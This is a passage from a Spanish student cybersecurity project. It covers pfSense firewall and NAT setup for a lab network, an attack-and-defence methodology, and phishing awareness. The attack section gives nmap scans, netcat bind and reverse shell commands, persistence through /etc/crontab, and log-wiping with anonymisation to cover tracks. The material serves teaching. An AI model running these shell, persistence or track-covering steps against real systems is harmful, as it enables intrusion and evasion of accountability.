    “Add/Sign”. Este certificado nos servirá para habilitar SSL y por tanto HTTS en nuestro
    servidor.
3. En la nueva ventana deberemos rellenar los datos relacionados con el certificado. Serán
    los mismos empleados en HERACLES. Además, la autoridad certificadora es la que
    hemos definido en el paso 1. El resto de valores los dejamos por defecto. Finalmente
    pulsamos en _Save._


4. Una vez creado el certificado volvemos al paso 1 de _Advanced_ e indicamos que
    queremos usar HTTPS y, en el desplegable que se nos abrirá, indicamos el certificado
    SSL que acabamos de crear.

_User Manager_

1. En el apartado _Settings_ , por seguridad vamos a establecer un tiempo de expiración de
    la sesión por si la dejáramos abierta. Este tiempo va a ser de una hora (60 minutos).
2. En el apartado _Users_ vamos a crear un nuevo usuario y no tener que estar usando
    _“Admin”_. Para ello, hacemos clic en el botón “Add”.
3. En la nueva ventana que nos saldrá vamos a indicar los datos del nuevo usuario así el
    grupo del que es miembro, en este caso de Admins. Tras esto, le damos a “Save”.


4. De nuevo en la pantalla de los usuarios, sobre nuestro nuevo usuario, vamos a hacer clic
    sobre el lápiz para definir nuevos privilegios.
5. Como veremos, tenemos una nueva sección llamada _Effective Privileges_ , hacemos clic
    sobre el botón “Add”.
6. En el listado de privilegios que se pueden asignar, buscamos _“User- System: Shell_
    _account access_ ” y clicamos en el botón “Save”.


7. Finalmente guardamos la configuración del usuario con el botón _Save_. En el listado de
    usuarios pasaremos a editar el usuario _admin_.
8. Por motivos de seguridad, vamos a indicar que el usuario no podrá iniciar sesión. Esto
    se hace marcando la casilla _“This user cannot login”_ y guardamos. Con esto tendríamos
    terminada la configuración de Sistema.


#### Configuración relacionada con las interfaces

1. Abrimos el menú desplegable “Interfaces” y seleccionamos la interfaz “OPT1”. En la
    configuración de la interfaz, en el campo _Description_ , cambiamos ese valor a “DMZ”.
    Finalmente hacemos clic en _Save_. Este mismo procedimiento lo realizamos con la
    interfaz “OPT2” y cambiando el valor a “SEC”.

```
El resultado final debe quedar de la siguiente manera:
```

#### Configuración relacionada con el firewall

1. En el apartado NAT veremos que tenemos dos registros en _“Outbound”_ ,
    específicamente en “Automatic Rules”. Estas reglas están configuradas para que, desde
    las tres redes definidas a través de las interfaces internas, puedan salir a Internet por la
    red WAN.
2. En el apartado RULES vamos a definir reglas de firewall según la interfaz. Para ello,
    debemos tener el planteamiento de lo que queremos permitir y denegar. Para añadir
    una regla usaremos el botón _“Add”_ que ahora nos será indiferente pulsar uno u otro.
3. Comenzando por SEC, vamos a crear una regla que permita cualquier tráfico dentro de
    su subred. Activaremos el log y lo configuraremos solo en IPv4 ya que anteriormente
    deshabilitamos IPv6. Una vez definida le damos a “Save”. Con esta regla hacemos que
    se pueda operar dentro de la red SEC.


4. Además, vamos a crear una regla para que no podamos comunicarnos con la puerta de
    enlace y por tanto no salir al exterior. Esto lo hacemos bloqueando cualquier protocolo
    en IPv4 e IPv6 con origen en la red SEC y destino la dirección IP de la puerta de enlace
    de SEC.


5. En DMZ vamos a crear varias reglas que permitirán solo el acceso a los puertos 80, 443,
    21 , 22 y el rango 30000 a 31000 para FTP PASV. Cada puerto va a tener una regla
    definida. Además, para que la comunicación sea bidireccional, definiremos las mismas
    reglas, pero configurando origen y destino a la inversa.

```
El resultado final quedará de la siguiente manera:
```

6. En LAN mantendremos las mismas reglas que nos trae por defecto que son el acceso a
    la configuración de ZEUS vía SSH y HTTPS y cualquier comunicación del interior de LAN
    a toda la red e incluso a Internet.
7. En SEC se nos quedará por tanto las siguientes reglas definidas:
8. Volvemos de nuevo al apartado _“NAT”_ para definir las reglas que nos permitirán
    conectarnos desde el exterior a la página web y servidor FTP de HERACLES. Para ello, en
    la sección _“Port Forward”_ haremos clic sobre el botón _“Add”_.


9. En la ventana que nos saldrá deberemos indicar los siguientes datos:
    a. **Interface** : WAN _(Permite la comunicación a través de la WAN)_
    b. **Protocol** : TCP/UDP
    c. **Source** : Any _(Permite que el origen sea cualquier dirección IP)_
    d. **Source port range** : Any _(Pueden existir puertos dinámicos en el lado del cliente)_
    e. **Destination** : WAN address _(Indicamos que el destino de la comunicación es la_
       _interfaz WAN)_
    f. **Destination port range** : HTTP _(Dependerá del servicio que queramos permitir)_
    g. **Redirect target IP** : 10.10.10.2 _(Indicamos la dirección IP de HERACLES)_
    h. **Reditect** target port: HTTP _(Debe ser el mismo valor que “Destination port_
       _range”)_
    i. **Description** : Es opcional, pero recomiendo indicar una que sea clara, concisa y
       defina el propósito de la regla
    j. **Filter rule association** : Pass _(Indicamos que permita pasar el tráfico)_
Una vez realizado hacemos clic sobre el botón _“Save”_


10. Importante: Debemos permitir además el rango de puertos FTP para la conexión pasiva.
    Este mismo procedimiento lo repetiremos para el tráfico FTP y HTTPS. Finalmente
    deberá quedar de la siguiente manera:


#### Configuración relacionada con copias de seguridad

1. Para realizar copia de seguridad de la configuración actual iremos al menú
    _“Diagnostics”_ , opción _“Backup & Restore”_. En la ventana que nos saldrá desmarcaremos
    la casilla _“Skip RRD data”_ y hacemos clic sobre el botón _“Download configuration as_
    _XML”_ para obtener el fichero de backup.

```
El contenido del fichero resultante es parecido al siguiente:
```
2. Para recuperar la configuración definida en una copia de seguridad, en la misma página,
    en la sección _“Restore Backup”_ indicamos el fichero generado y clicamos sobre _“Restore_
    _Configuration”_


#### Configuración relacionada con el monitoreo

Nos encontramos con dos maneras de monitorear lo que pasa en el servidor. Estas son las
siguientes:

1. A través de la página principal. Podemos modularla según como nosotros queramos
    para que muestre la información que consideramos importante.
2. La segunda es a través de la pestaña _“Diagnostics”_ la cual nos permite obtener datos de
    diagnóstico más específicos como realizar otras opciones que pueden ser la gestión de
    copias de seguridad o reinicio del sistema.


## Pruebas de funcionamiento

### Servicio Web y FTP con certificado (HERACLES)

**HTTP desde cliente**

**HTTPS desde cliente**


**FTP seguro desde cliente**


### Servicio de copia de seguridad y MySQL (TESEO)

**Directorios de la copia de seguridad resultante (se realiza a las 0 1 : 30 am)**

**Acceso al servidor SQL**


### Servicio DNS y DHCP (ATENEA)

**Consulta registro DNS**

**Asignación configuración IP de la red vía DHCP a la interfaz eth1**

**Concesión de la configuración a un cliente**


### Estudio de vulnerabilidades (HADES)

**Escaneo de los puertos del servidor HADES con nmap**


## Metodología de ataque y defensa

Para poner a prueba la seguridad de nuestro sistema informático, vamos a definir una
metodología de ataque y defensa a seguir. Esta metodología se plantea en las empresas como
elemento necesario en el entrenamiento de equipos de seguridad para, posteriormente, poder
ser usada en producción.

Los apartados que vamos a contemplar en esta metodología son:

- Fases del ataque
- Opciones de defensa
- Ingeniería social y concienciación

### Fases del ataque

Dentro de una metodología de ataque/defensa tenemos que saber de que maneras pueden
atacarnos los hackers o crackers. El estándar de las fases de ataque (y que se suele seguir) son
los siguientes:

#### 1. Reconocimiento

```
En esta primera fase nos encargaremos de obtener información acerca del sistema. Aquí
podemos emplear recursos de internet como puede ser el uso de Google dorks, Bing dorks
y el buscador de equipos y servicios Shodan. Además, entra en juego la ingeniería social (de
la que se hablará más tarde), el Dumpster Diving (escarbar en las papeleras para obtener
documentos con información de empleados o del sistema) y esnifar la red (esto se realizaría
desde dentro de la red).
Un ejemplo de empleo de Google Dorks es centrarnos en obtener ficheros de una
determinada extensión sabiendo el sitio web y analizar los metadatos de ese fichero para
encontrar posibles rutas de acceso, datos del programa usado o datos de la persona que ha
gestionado el fichero.
Con el siguiente dork obtendremos los ficheros con extensión “.docx” pertenecientes a la
web del ministerio de sanidad de España.
site:www.mscbs.gob.es filetype:docx
```

En la siguiente captura podemos ver los resultados obtenidos. Si descargamos el primer
fichero y comprobamos los metadatos podemos ver quienes lo han editado entre otros
valores. Con estos datos podemos comenzar a trabajar en técnicas de ingeniería social y en
recolección de datos mediante OSINT (fuentes abiertas) como son direcciones de correo
electrónico entre otros.

En la siguiente captura podemos ver los metadatos del fichero “Modelo 1.docx”.

En caso de actuar dentro del sistema podemos definir rango de direcciones IP a través del
sniffing de la red. Esto lo realizaremos con Wireshark y así sabremos si disponemos de
impresoras, servidores NAS, etc.


En esta captura podemos deducir que la red en la que nos encontramos trabaja en la
192.168.1.0/24. Solo es necesario indicar la interfaz en la que queremos esnifar.

Además, para confirmar que trabajamos en la máscara 255.255.255.0 solo hay que ejecutar
el comando _ipconfig_ en nuestro ordenador.

En resumen. El reconocimiento trata de obtener toda la información posible del sistema que
queremos atacar. Dicha información se obtendrá siguiendo un procedimiento u otro
dependiendo del lugar en el que nos encontremos respecto a la red.


#### 2. Exploración

En esta fase, con los datos recolectados durante el reconocimiento, comenzaremos a
escanear el sistema en busca de posibles vulnerabilidades. Partimos de que la vulnerabilidad
más fácil que encontramos en el sistema será cualquier empleado o factor humano ya que,
jugando a la ingeniería social, podemos obtener el acceso de una manera rápida. Para
realizar el escaneo en ambas partes podemos emplear herramientas de escaneo y barrido
de puertos como es **NMAP**.

Para el caso de encontrarnos fuera vamos a comenzar ejecutando esta herramienta
apuntando a la dirección IP pública. El comando a usar es el siguiente:

nmap -sS -sU -T4 -O -sV - v -n 192.168.205.128
Los diferentes parámetros del comando son:

```
Param. Descripción
```
**- sS** Realiza un escaneo TCP
**- sU** Realiza un escaneo UDP
**- T4** Indica la velocidad de ejecución de nmap. A mayor número más probable es
    que lo detecte el IDS y falle. El nivel va desde T0 (modo paranoico) a T5 (modo
    loco)
**- O** Detecta el sistema operativo
**- sV** Detecta la versión de las aplicaciones instaladas
**- v** Imprime por pantalla información detallada de lo que se está haciendo (para
    aumentar el nivel de detalle hay que agregar tantas veces el parámetro como
    se quiera).
**- n** Desactiva la resolución DNS inversa

La duración de este escaneo es de unas 6 horas aproximadamente ya que trata de escanear
todos los puertos conocidos y obtener los datos acerca de los servicios relacionados con
estos (nombre del servicio, versión...)

Para la demostración obviaremos el escaneo con scripts y tracert y ejecutaremos el
comando indicando los parámetros específicos para detección de sistema operativo y
aplicaciones o servicios.


```
Como podemos observar, es capaz de detectarnos los puertos abiertos al público,
aunque tenemos dos situaciones que son:
```
- Viene poca información del servicio (Indica nombre o como mucho una posible
    versión)
- Aparece como cerrado y solo se conoce el servicio que se asocia con un número
    de puerto estándar.

#### 3. Obtener Acceso

Para obtener el acceso al sistema vamos a emplear la biblioteca de vulnerabilidades de
NMAP. Para ello, vamos a ejecutar el siguiente comando:

```
nmap -sS - sV – script all 192.168.205.128
```
El resultado del escaneo podemos verlo en la siguiente URL:
https://pastebin.com/XhqwNXqU

Dentro del catálogo de scripts podemos encontrar varias categorías que son:

- **Auth:** Scripts relacionados con autenticación
- **Default:** Scripts básicos de nmap
- **Discovery:** Scripts para recuperar más información de la víctima
- **External:** Scripts que emplea recursos externos
- **Intrusive:** Scripts considerados como intrusivos para la víctima
- **Malware:** Scripts que comprueban si hay conexiones abiertas (backdoors) por
    ejecución de malware
- **Safe:** Scripts considerados como no intrusivos para la víctima
- **Vuln:** Scripts de las vulnerabilidades más conocidas
- **All:** Ejecuta todos los scripts disponibles
Del resultado del escaneo vamos a quedarnos con el servicio FTP ya que nos indica que
podría ser vulnerable a un ataque. Este nos indica un CVE específico de la vulnerabilidad
para poder rastrear exploits en Internet y emplear el que mejor nos venga.


Con este CVE podemos ir a la web https://www.exploit-db.com/search donde,
indicando el CVE que nos devuelve NMAP, podremos obtener un exploit a medida.
Indicamos el CVE en el campo destinado a tal efecto.

En este caso podemos ejecutar un DoS (Denegación del Servicio) al servidor para que
deje de funcionar. Para ello, solo tendríamos que indicar un nombre de usuario bastante
largo o, incluso, cabría la posibilidad de ejecutar código arbitrario en el servidor.

Pero en caso de intentarlo nos encontramos con que parte de la configuración del
sistema impide el acceso de usuarios no anónimos sin encriptación así que, el único
punto vulnerable (ya que es el que nos detecta NMAP) no nos sirve el CVE y
vulnerabilidad detectada porque, recordando anteriormente, nos dice que el servicio es
**_vsftpd 2.0.8 or later_** , es decir, puede ser cualquier otra versión de la que no tenemos
conocimiento.


#### 4. Mantener el acceso

A pesar de no poder entrar dentro del sistema me gustaría aclarar las dos fases restantes.
En esta cuarta fase nos centraremos en mantener el acceso. Por lo que hemos podido
deducir a raíz de los escaneos estamos trabajando sobre un sistema operativo Linux ya que
en el fingerprint TCP/IP se está realizando a un sistema operativo GNU Linux de 64 bits.
Normalmente en este caso montaremos una _bind Shell w/ Netcat_ que estará a la escucha y
no nos delatará si nos detecta el administrador del sistema (ya que solo habrá que indicar
en que puerto debe escuchar). Para ello, en cada máquina se debe ejecutar un comando
exacto que es el siguiente:

```
MÁQUINA ATACANTE
```
```
nc 192.168.205.128 1234
```
##### MÁQUINA VÍCTIMA

```
nc -lvp 1234 -e /bin/sh
```
Esto se puede ocultar a través de una tarea designada dentro del fichero _/etc/crontab_ para
que ejecute ese comando regularmente (cada semana o cada 15 días). Lo importante de
este método es que se aconseja acceder desde varias direcciones IP (o un servidor proxy) ya
que queda registro de las conexiones realizadas al servidor.

En cambio, si queremos optar por una _reverse Shell w/ Netcat_ los comandos quedarían de
la siguiente manera:

```
MÁQUINA ATACANTE
```
```
nc -lvp 1234
```
##### MÁQUINA VÍCTIMA

```
nc -e /bin/sh [IP-ATACANTE] 1234
```
El punto principal negativo de este método es que estamos indicando directamente la
dirección IP a la que debe permitir la conexión siendo esto una gran facilidad para la defensa
de poder dar con el equipo atacante.

En resumen, la diferencia entre una _bind Shell_ y una _reverse Shell_ es que en la primera
estamos poniendo el puerto a la escucha y se puede acceder desde cualquier IP pero con el
segundo método estaremos definiendo una única dirección IP a la que debe permitir el
control.


#### 5. Borrar huellas

```
Por último, y no menos importante, tenemos el borrado de huellas o pruebas. Esto se
soluciona borrando los logs de acceso o, en su defecto, alterarlos para que no parezca que
haya habido actividad ilegítima. Esto lo podemos conseguir haciendo una copia antes de
nada de los ficheros de log del sistema operativo. Estos ficheros son los siguientes:
```
```
/var/log/message Registro general del sistema
/var/log/auth.oog Logs de autenticación
/var/log/httpd/ Registro por defecto de apache
/var/log/secure Logs de autenticación
/var/log/utmp Registro de login
/var/log/wtmp Registro de login
```
```
En todo caso, y sabiendo las aplicaciones que corre el sistema, es de vital importancia
investigar las posibles ubicaciones de los logs de cada una de estas. Si no quisiéramos
centrarnos en este paso será de vital importancia emplear un servidor proxy o una conexión
a terceros que nos anonimice (como la red TOR por ejemplo) para que nuestra dirección IP
no se pueda rastrear. Igualmente es recomendable cambiar la dirección MAC de nuestro
equipo.
```
### Opciones de defensa

Dentro de este apartado me voy a dedicar a dar algunos consejos que se deberían llevar a cabo
como defensores de un sistema o, en este caso, de un SOC.

Como consejo general considero de vital importancia la concienciación al usuario final, así como
una política de seguridad predefinida ya que los usuarios son el eslabón más débil de la cadena
de la seguridad informática y, por tanto, donde más se requiere invertir. Además, consideraría
emplear una VPN para conectarse desde lugares externos, así como la habilitación de
mecanismos de doble verificación.

A nivel de hardware mantener la redundancia en todos los elementos que se pueda, desde
cableado de comunicaciones hasta discos duros. Además, contemplar en el diseño que sea difícil
el acceso para un atacante de manera física mediante controles de seguridad biométricos.

A nivel de software el emplear la virtualización para que, si fallase el sistema, se pueda desplegar
de manera rápida y eficaz una copia de ese mismo sistema bajo uno de los componentes físicos
redundantes. Igualmente, seguir una política activa de copias de seguridad como se ha visto e
implementado en el diseño de la red.

A nivel de seguridad lógica, emplear honeypots. Estos honeypots consisten en sistemas que
aparentan ser reales pero que en realidad se emplea por parte del defensor para obtener la
mayor información posible del atacante. Se considera útil añadir también varias capas de firewall
y emplear sistemas de detección de intrusos.

Finalmente, a nivel de red, contar con equipos que permitan también hacer labores de filtrado
para, en la mayor medida posible, descongestionar el tráfico de red. Aquí entra en juego
EtherChannel o los SDN (redes definidas por software). Cisco ofrece soluciones específicas para
esta situación.


### Ingeniería social y concienciación

Como he mencionado anteriormente, el eslabón más débil de la seguridad informática siempre
será el usuario final. Por ello, esta sección se dividirá en dos partes que son en que consiste la
ingeniería social y ejemplos y la concienciación a los usuarios finales acerca de cuándo sospechar
o no de alguna campaña fraudulenta, así como la elaboración de un plan de formación para los
empleados.

#### Ingeniería social, ¿qué es y cómo es?

Según la Wikipedia, la ingeniería social “ _es la práctica de obtener información confidencial a
través de la manipulación de usuarios legítimos”_ aunque si la llevamos al ámbito práctico
podemos terminar la definición indicando que emplearemos métodos presenciales o a distancia
para obtener la confianza del usuario. Esto lo haremos trabajando sobre cuatro principios
humanos que son:

- A todos nos gusta ayudar
- A todos nos gusta que nos alaben
- A nadie le gusta decir NO
- El primer movimiento deberá ser de confianza al otro

Además, añadiría dos más que se encuentran en auge que son:

- A todos nos gusta tener todo por delante
- Se puede aprovechar un problema ya existente

Estos dos nuevos principios surgen ahora en la época del coronavirus donde, en España, se ha
visto obligado al paro de toda actividad económica repercutiendo gravemente en la sociedad.
Es cierto que es descabellado emplear una pandemia que se está cobrando varias víctimas, pero
en muchos hospitales han sido víctimas de campañas de phishing como se puede ver en el
siguiente enlace: https://unaaldia.hispasec.com/2020/03/campana-de-phishing-a-hospitales-
aprovechando-la-crisis-del-coronavirus.html

Me gustaría también hacer un apunte acerca de lo que entienden expertos como estudiantes
de seguridad informática acerca de la ingeniería social ya que, de todas las frases que han salido,
las que más destacaría son las siguientes.

_“La ingeniería social permitiría adivinar los movimientos del individuo promedio (que no del
individuo concreto) así como del conjunto total, y por tanto también permitiría saber que
estímulos hay que aplicar a dicha sociedad para provocar una serie de acciones y opiniones
generalizadas.”_

_“Consiste en hacer lo que cualquier hacker, pero sin usar tecnología informática.”_

_“La ingeniería social es el arte de aprovechar las vulnerabilidades psicológicas o patrones sociales
de la mayoría de las personas para conseguir un comportamiento o respuesta deseado.”_

_“Se podría definir como una especie de engaño, a raíz de confusión hacer que una persona actúe
contra sus propios intereses.”_

Resumiendo, la opinión de personal dentro del sector podemos deducir que la ingeniería social
va más allá de la obtención de la información, es decir, llegar al nivel de saber anticiparse a la
sociedad aprovechando las vulnerabilidades de estas. Pasar la informática a lo analógico, al lado
más humano.


Ahora bien, sobre los principales ataques que suele caer alguien relacionados con la ingeniería
social son el phishing _(engañar a una persona suplantando a otra o a una entidad a través del
correo electrónico)_ , smishing _(igual que el phishing, pero usando teléfonos móviles)_ y el pharming
_(redirigir el tráfico a un sitio web fraudulento alterando los registros DNS)._

Estos dos ataques siempre van de la mano ya que podemos engañar a un usuario de distintas
maneras para guiarlo a una web ilegítima con apariencia de un banco popular y que deba indicar
las credenciales de acceso porque han intentado acceder a su cuenta bancaria.

```
Campaña de phishing suplantando a BBVA
```
En este caso nos encontramos con una campaña de phishing genérica haciéndose pasar por
BBVA. Para un usuario estándar puede parecer que está ante un correo legítimo ya que hasta el
remitente pone que es de un dominio BBVA aunque encontramos dos detalles principales que
son:

- El dominio de BBVA es bbva.es y no bbva.com
- Se emplean mayúsculas en mitad de frases incumpliendo las reglas ortográficas

Ahora bien, estas campañas se mandan a una gran cantidad de usuarios que, la mayoría, no
pertenecerá a dicha entidad bancaria por lo que ahí puede existir una gran sospecha para el
usuario final, pero en el caso de ser de BBVA podrá ser difícil de detectar que es una campaña
de phishing.


```
Campaña de phishing suplantando a Apple
```
En cambio, en esta campaña (que va directamente al correo no deseado), nos envían un mensaje
en el que se presupone que es Apple indicando que nuestro Apple ID se ha visto bloqueado.
Aquí podemos observar varios elementos en los que, la mayoría de las personas serán capaces
de detectar que es un caso de phishing. Estos elementos son:

- Está en Correo no deseado o Spam
- Nos adjunta un fichero (que normalmente es un fichero malicioso)
- Para la categoría del mensaje (acerca de nuestra información de inicio de sesión) no nos
    llama por nuestro nombre sino por “Cliente”.
- Indica al destinatario que hace algo dentro de un determinado tiempo o tendrá
    consecuencias negativas.
- No existe un logotipo en el correo de la empresa
- La dirección de correo electrónico ni siquiera tiene el dominio apple.com
- No existe información de la ubicación de la empresa o mensaje de protección de datos
    y confidencialidad

Finalmente tenemos las campañas de Spear phishing. Estas campañas se centran en un único
usuario del que se ha realizado una investigación previa y que incluye datos como el nombre de
la víctima, lugar donde trabaja, teléfono, etc. Con esto conseguimos hacer creer más al usuario
que somos un usuario legítimo (por ejemplo, un miembro del soporte técnico externalizado de
la empresa).

Como comenté anteriormente, la ingeniería social tratará de emplear un problema existente y
común de la sociedad para hacer “picar” a la mayor cantidad de usuarios posibles en una de
estas campañas. Un ejemplo de esta campaña es la que muestro a continuación que consiste en
la suplantación del Gobierno de España.


```
Campaña de phishing suplantado al Gobierno de España
```
En una sola campaña podemos ver los dos nuevos principios de la ingeniería social que
hablábamos al principio del apartado y que son:

- **A TODOS NOS GUSTA TENER TODO POR DELANTE**
    o Nos están indicando que tenemos una devolución a favor nuestra de 345,37€
- **SE PUEDE APROVECHAR UN PROBLEMA YA EXISTENTE**
    o Si vemos la fecha máxima del supuesto enlace es del 10 de mayo de 2020, es
       decir, en mitad del estado de alarma decretado en España y en donde,
       supuestamente, muchos españoles iban a cobrar ayudas económicas del
       gobierno español a causa de los ERTE _(Expediente de regulación temporal de_
       _empleo)_.

Igualmente podemos observar otro principio que es el principio de **“EL PRIMER MOVIMIENTO
DEBERÁ SER DE COFIANZA HACIA EL OTRO”**. Esto se cumple cuando mandamos el correo
electrónico haciéndonos pasar por el Ministerio de Inclusión, Seguridad Social y Migraciones.


#### Concienciación

Todo lo realizado anteriormente no nos servirá de nada cuando no nos centramos en formar y
concienciar al usuario final de los ataques que puede sufrir sin darse cuenta y que pueda
comprometer información confidencial sin mala intención. Un ejemplo de esto es la estafa del
CEO que consistía en obtener el acceso a la cuenta de correo electrónico del CEO de una empresa
o simplemente haciéndose pasar por él y convencer a los empleados de la empresa con acceso
al dinero de esta que hagan pagos de facturas falsas o transferencias bancarias a otra cuenta.
Normalmente esta estafa requiere conocer la estructura interna de la empresa y juegan con el
indicar a la víctima que se trata de algo urgente y que se trate en la máxima confidencialidad
posible.

Para evitar estas situaciones se debe fomentar en las empresas (y especialmente en aquellas
que cuenten con un SOC, CyberSOC, SIEM o NOC) el desarrollo de un plan de concienciación con
unos objetivos definidos a corto, medio y largo plazo, así como una serie de actuaciones a
realizar a un nuevo empleado y en caso de producirse un ataque.

Dicho plan considero que debería de tener los siguientes puntos:

1. Tipos de perfiles en la empresa
    a. Datos de miembros principales de la empresa (nombre y apellidos, correo
       electrónico corporativo...).
    b. Datos de los perfiles según la categoría de activos que traten en la empresa
       (encargados de determinados activos como son datos, bienes económicos...).
2. Plan de formación
    a. Principios básicos de ingeniería social, cómo actúan los atacantes.
    b. Detección de phishing y smishing.
3. Datos del DPO (delegado de protección de datos)
4. Objetivos del plan (deberán contener descripción de cada objetivo, así como los
    indicadores que se emplearán para saber que se cumple correctamente)
       a. Corto plazo (1 – 5 meses)
       b. Medio plazo (6 – 12 meses)
       c. Largo plazo (1 año en adelante)
5. Procedimientos en caso de ataques de Ingeniería Social
    a. Según el activo afectado
    b. Según el alcance del ataque
6. Fecha de revisión y encargado del plan de concienciación


## Problemas durante el proyecto...................................................................................................

Son dos problemas breves que he tenido en el transcurso del proyecto pero que sería de interés
dejarlo expuesto en este documento, así como lo que se ha empleado para solucionarlo. Estos
problemas han sido:

**1. ACTUALIZACIÓN DE VMWARE CON BUGS**
    Al realizar la actualización que nos sugería VMware se comenzó a dar un problema en
    los clientes virtuales que contaban con GUI el cuál provocaba que estos activasen y
    desactivasen el bloqueo de mayúsculas siendo imposible iniciar sesión en estos. Para
    comprobar lo que pasaba se creó una máquina virtual siguiendo el mismo
    procedimiento que el anterior y con el mismo fichero ISO, pero seguía el mismo
    problema. Se hizo el mismo procedimiento con una nueva ISO y con otro SO, pero
    todavía seguía dicho problema.
    Se recurrió a configurar en otro equipo anfitrión las máquinas virtuales, pero daba el
    mismo problema. Tras esto, se comenzó a pensar en un problema del software de
    virtualización y se comprobó como en ambos clientes existía la misma versión de la
    aplicación así que, buscando en los foros de comunidades oficiales del fabricante se
    encuentran varios reportes de un bug en esa versión.
    Finalmente se opta por realizar un downgrade (cambiar a una versión anterior de la
    aplicación) y se consiguió solucionar. Esta medida estará aplicada hasta que se corrija el
    bug de esa versión. La versión afectada es la 15.5.5.

##### 2. ERROR DE ACCESO AL SERVIDOR FTP

```
Se nos presenta una situación en la que, desde un cliente interno, se puede acceder al
servidor FTP en modo anónimo como con las credenciales de acceso de cada usuario,
aunque, si desde un cliente externo tratamos de acceder, la autenticación a pesar de
realizarse no se consigue listar el árbol de directorios del servidor. El error fue fácil de
detectar ya que, analizando los logs en el lado del cliente se podía observar como no se
podía acceder en modo pasivo (problema que no ocurría al cliente interno). Tras hablar
al respecto con los profesores se logró detectar que no existía ninguna regla en el
firewall que permitiera el uso de puertos dinámicos haciendo que se cumpla la política
por defecto y se deniegue la conexión.
Para solventar este problema se define en el servidor FTP (HERACLES) unos parámetros
entre los que se indica un rango de puertos dinámicos sobre los que operar además de
la regla de firewall asociada a ese rango de puertos. Una vez realizado ya se podía
acceder con normalidad desde cualquier lugar al servicio FTP.
```

## Observaciones y conclusión del proyecto

Para finalizar el proyecto me gustaría indicar varias observaciones que, durante el desarrollo del
proyecto, me gustaría puntualizar en este apartado.

Lo principal, recordad que la informática es un entorno totalmente dinámico, donde lo
establecido hace unos días puede ser necesario cambiar en cualquier momento. Esto lo he
podido observar mediante los reportes que me llegaban del INCIBE (Instituto Nacional de
Ciberseguridad) acerca de nuevas vulnerabilidades ya que, a raíz del COVID-19 han crecido de
manera exponencial las vulnerabilidades en productos de empresas como son Cisco, HP,
WordPress, MySQL, GitLab, GitHub, Sony, Microsoft, Oracle y un sinfín de empresas.

Continuando, ha sido de gran utilidad la formación en línea, pero, especialmente, los grupos de
comunidades que hay en Telegram. Entre ellos, quiero destacar dos principales que son
_@GrupoDAW_ que ofrece una comunidad formada por estudiantes de los ciclos formativos de
informática y _@HappyHackingSevilla_ , una comunidad sevillana entusiasta de la seguridad
informática y que ahora ha entrado a formar parte de la alianza SVQTECH la cuál agrupa todas
las comunidades tecnológicas de la provincia. Esto hace que se encuentre un punto de consulta
con expertos del sector que trabajan a diario en ciberseguridad y que han podido resolverme
dudas mejor de lo que hace incluso Internet.

Como tercer punto, recalcar que este proyecto es un comienzo. Para desarrollar un SOC hace
falta trabajar día a día, es decir, nunca se termina de desarrollar un SOC, pero si se puede mejorar
y para ello, es necesario mejorarse como profesional. Para ello, a parte del catálogo formativo
existente, aconsejo participar en CTFs (Captura la Bandera) las cuales consisten en superar
pruebas de seguridad informática tratando todos los ámbitos (desde hacking web hasta
informática forense y OSINT).

Finalmente, como punto final, y como diría mi profesor de historia, no es tan importante la meta
como lo es el camino. Aplicando esta frase al proyecto puedo decir que estas semanas de
investigación me han podido llegar a aportar más de lo que es en sí el mismo proyecto ya que
he aprendido a usar herramientas y tecnologías que, aunque no tengan relación con el proyecto,
me servirán para un futuro como profesional de este sector.


## Agradecimientos

Quisiera agradecer a todas las personas que me han ayudado a lo largo del proyecto tanto
personal como profesionalmente.

A mis padres, tíos y abuelos, que me han ayudado a despejarme en los momentos en los que
me veía incapaz de continuar con el proyecto y el ciclo formativo adelante.

A la comunidad de Hacking Sevilla, Follow the White Rabbit y Underc0de por el apoyo técnico
recibido ante las dudas que han ido surgiendo.

A este mismo instituto, IES Ciudad Jardín, a Juanlu, Nuria, Vicente, Jaime, todo el profesorado y
personal administrativo, servicios y alumnado. Gracias por el cariño que me habéis dado durante
estos dos años y por hacerme recuperar la fe en una enseñanza de calidad y que piensa en el
alumnado.

A mi profesor de 4º ESO del IES Cristóbal de Monroy, Jose Manuel Róas Triviño. Gracias por
arriesgarte y permitirme seguir estudiando lo que me apasiona y por transmitir las ganas y
pasión que le pones al mundo, gracias por ser ejemplo de superación.

A mis amigos Manuel, Adrián y Juan José, que a pesar de las distancias me ayudaron a seguir
adelante con el ciclo formativo y me ayudaron a encontrar mi pasión.

A Cruz Roja Española, especialmente a mi pequeña segunda familia de juventud, Astacio, Isa,
Lucía, Covadonga, Ruth, Inma, Solano y Sandra. Gracias por acompañarme en los momentos más
difíciles de todos estos años.

A todos los que no he nombrado, pero han pasado por mi vida, gracias por hacerme ser la
persona que soy hoy.


## Webgrafía

https://www.linuxtotal.com.mx/index.php?cont=rsync-manual-de-uso

https://maslinux.es/los- 15 - mejores-programas-de-copia-de-seguridad-de-codigo-abierto-para-
gnu-linux/

https://unicarlos.com/wa/moduloproyecto/sti/pedro_jose_garcia_moreno_pfsense.pdf

https://www.youtube.com/watch?v=TOnlk1AHn1Q

https://aulavirtual.iesciudadjardin.es

https://www.uv.es/sto/articulos/BEI- 2003 - 01/ssh_np.html

https://voragine.net/linux/acceso-ssh-seguro-servidor-autenticacion-clave-publica

[http://decodigo.com/python-verificar-si-existen-archivos-y-carpetas](http://decodigo.com/python-verificar-si-existen-archivos-y-carpetas)

https://codigofacilito.com/articulos/fechas-python

https://docs.quantifiedcode.com/python-anti-patterns/readability/comparison_to_true.html

https://geekytheory.com/programar-tareas-en-linux-usando-crontab

[http://www.secnot.com/comprimir-directorio-linux.html](http://www.secnot.com/comprimir-directorio-linux.html)

[http://www.hypexr.org/linux_scp_help.php](http://www.hypexr.org/linux_scp_help.php)

[http://www.javiercarrasco.es/2013/02/08/no-se-pudo-bloquear-varlibdpkglock-open-](http://www.javiercarrasco.es/2013/02/08/no-se-pudo-bloquear-varlibdpkglock-open-) 11 -
recurso-no-disponible-temporalmente/

https://www.youtube.com/watch?v=73A_nZyxzzM

https://www.linuxito.com/seguridad/5 98 - como-crear-un-certificado-ssl-autofirmado-en-dos-
simples-pasos

https://www.zevenet.com/es/knowledge-base/howtos/create-certificates-pem-format/

https://serverfault.com/questions/449651/why-is-my-crontab-not-working-and-how-can-i-
troubleshoot-it

https://www.mikroways.net/2009/06/24/habilitar-https-en-apache/

https://www.cica.es/servicios/conectividad/servidor-ntp/

https://www.pcwdld.com/traceroute

https://www.reddit.com/r/PFSENSE/comments/g6v07b/nat_translation_to_internet/

https://www.bellera.cat/josep/pfsense/nat_cs.html

